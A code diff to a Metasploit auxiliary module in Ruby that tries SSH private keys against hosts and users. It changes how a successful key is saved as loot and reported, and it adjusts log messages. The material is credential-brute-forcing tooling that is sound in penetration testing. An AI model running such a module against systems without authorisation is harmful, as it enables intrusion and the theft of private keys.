@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::CommandShell
 
-	attr_accessor :ssh_socket, :good_credentials, :good_key
+	attr_accessor :ssh_socket, :good_credentials, :good_key, :good_key_data
 
 	def initialize
 		super(
@@ -147,7 +147,6 @@ class Metasploit3 < Msf::Auxiliary
 	def do_login(ip,user,port)
 		if datastore['KEY_FILE'] and File.readable?(datastore['KEY_FILE'])
 			keys = read_keyfile(datastore['KEY_FILE'])
-			@keyfile_path = datastore['KEY_FILE'].dup
 			cleartext_keys = pull_cleartext_keys(keys)
 			msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
 		elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?
@@ -155,7 +154,6 @@ class Metasploit3 < Msf::Auxiliary
 			cleartext_keys = pull_cleartext_keys(keys)
 			msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user (read from datastore)."
 		elsif datastore['KEY_DIR']
-			@keyfile_path = datastore['KEY_DIR'].dup
 			return :missing_keyfile unless(File.directory?(key_dir) && File.readable?(key_dir))
 			unless @key_files
 				@key_files = Dir.entries(key_dir).reject {|f| f =~ /^\x2e/ || f =~ /\x2epub$/}
@@ -178,6 +176,7 @@ class Metasploit3 < Msf::Auxiliary
 				:msfmodule    => self,
 				:port         => port,
 				:key_data     => key_data,
+				:disable_agent => true,
 				:record_auth_info => true
 			}
 			opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
@@ -194,9 +193,9 @@ class Metasploit3 < Msf::Auxiliary
 			rescue Net::SSH::AuthenticationFailed
 				# Try, try, again
 				if @key_files
-					vprint_error "#{ip}:#{rport} - SSH - Failed authentication, trying key #{@key_files[key_idx+1]}"
+					vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{@key_files[key_idx+1]}"
 				else
-					vprint_error "#{ip}:#{rport} - SSH - Failed authentication, trying key #{key_idx+1}"
+					vprint_error "#{ip}:#{rport} SSH - Failed authentication, trying key #{key_idx+1}"
 				end
 				next
 			rescue Net::SSH::Exception => e
@@ -207,6 +206,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		if self.ssh_socket
 			self.good_key = self.ssh_socket.auth_info[:pubkey_id]
+			self.good_key_data = self.ssh_socket.options[:key_data]
 			proof = ''
 			begin
 				Timeout.timeout(5) do
@@ -246,40 +246,50 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	def do_report(ip,user,port,proof)
-		store_keyfile_b64_loot(ip,user,self.good_key)
-		report_auth_info(
+	def do_report(ip, port, user, proof)
+		return unless framework.db.active
+		keyfile_path = store_keyfile(ip,user,self.good_key,self.good_key_data)
+		cred_hash = {
 			:host => ip,
 			:port => datastore['RPORT'],
 			:sname => 'ssh',
 			:user => user,
-			:pass => @keyfile_path,
+			:pass => keyfile_path,
 			:type => "ssh_key",
 			:proof => "KEY=#{self.good_key}, PROOF=#{proof}",
-			:active => true
-		)
+			:duplicate_ok => true,
+				:active => true
+		}
+		this_cred = report_auth_info(cred_hash)
 	end
 
-	# Sometimes all we have is a SSH_KEYFILE_B64 string. If it's
-	# good, then store it as loot for this user@host, unless we
-	# already have it in loot.
-	def store_keyfile_b64_loot(ip,user,key_id)
-		return unless db
-		return if @keyfile_path
-		return if datastore["SSH_KEYFILE_B64"].to_s.empty?
-		keyfile = datastore["SSH_KEYFILE_B64"].unpack("m*").first
-		keyfile = keyfile.strip + "\n"
-		ktype_match = keyfile.match(/--BEGIN ([DR]SA) PRIVATE/)
-		return unless ktype_match
-		ktype = ktype_match[1].downcase
-		ltype = "host.unix.ssh.#{user}_#{ktype}_private"
-		# Assignment and comparison here, watch out!
-		if loot = Msf::DBManager::Loot.find_by_ltype_and_workspace_id(ltype,myworkspace.id)
-			if loot.info.include? key_id
-				@keyfile_path = loot.path
-			end
+	def existing_loot(ltype, key_id)
+		framework.db.loots(myworkspace).find_all_by_ltype(ltype).select {|l| l.info == key_id}.first
+	end
+
+	def store_keyfile(ip,user,key_id,key_data)
+		safe_username = user.gsub(/[^A-Za-z0-9]/,"_")
+		case key_data
+		when /BEGIN RSA PRIVATE/m
+			ktype = "rsa"
+		when /BEGIN DSA PRIVATE/m
+			ktype = "dsa"
+		else
+			ktype = nil
 		end
-		@keyfile_path ||= store_loot(ltype, "application/octet-stream", ip, keyfile.strip, nil, key_id)
+		return unless ktype
+		ltype = "host.unix.ssh.#{user}_#{ktype}_private"
+		keyfile = existing_loot(ltype, key_id)
+		return keyfile.path if keyfile
+		keyfile_path = store_loot(
+			ltype,
+			"application/octet-stream", # Text, but always want to mime-type attach it
+			ip, 
+			(key_data + "\n"),
+			"#{safe_username}_#{ktype}.key",
+			key_id
+		)
+		return keyfile_path
 	end
 
 	def run_host(ip)
@@ -291,21 +301,21 @@ class Metasploit3 < Msf::Auxiliary
 			ret,proof = do_login(ip,user,rport)
 			case ret
 			when :success
-				print_good "#{ip}:#{rport} SSH - Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
-				do_report(ip,user,rport,proof)
+				print_brute :level => :good, :msg => "Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
+				do_report(ip, rport, user, proof)
 				:next_user
 			when :connection_error
-				vprint_error "#{ip}:#{rport} - SSH - Could not connect"
+				vprint_error "#{ip}:#{rport} SSH - Could not connect"
 				:abort
 			when :connection_disconnect
-				vprint_error "#{ip}:#{rport} - SSH - Connection timed out"
+				vprint_error "#{ip}:#{rport} SSH - Connection timed out"
 				:abort
 			when :fail
-				vprint_error "#{ip}:#{rport} - SSH - Failed: '#{user}'"
+				vprint_error "#{ip}:#{rport} SSH - Failed: '#{user}'"
 			when :missing_keyfile
-				vprint_error "#{ip}:#{rport} - SSH - Cannot read keyfile."
+				vprint_error "#{ip}:#{rport} SSH - Cannot read keyfile."
 			when :no_valid_keys
-				vprint_error "#{ip}:#{rport} - SSH - No cleartext keys in keyfile."
+				vprint_error "#{ip}:#{rport} SSH - No cleartext keys in keyfile."
 			end
 		end
 	end
